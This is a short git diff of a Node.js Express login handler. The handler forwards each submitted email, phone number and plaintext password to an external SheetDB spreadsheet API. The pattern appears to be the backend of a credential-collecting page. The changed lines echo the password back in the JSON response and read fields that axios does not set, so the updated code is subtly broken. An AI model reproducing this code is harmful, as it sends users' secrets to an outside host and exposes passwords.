@@ -36,20 +36,18 @@ app.post(baseUrl + "/login", (req, res) => {
     const email = data.email;
     const tel = data.tel;
     const password = data.password;
-    
+
     axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
         .then(response => {
-            console.log(response.data); // Assuming you want to log the response from the server
+            res.json({
+                message: `Email: ${response.email} Tel: ${response.tel} Password: ${response.password} logged in`
+            });
         })
         .catch(error => {
-            console.error(error); // Log any errors that occur during the POST request
+            res.json({
+                message: `${error}`
+            });
         });
-    
-    console.log(data);
-    
-    res.json({
-        message: `Email: ${email} Tel: ${tel} Password: ${password} logged in`
-    });
 });
 
 // Export the handler function
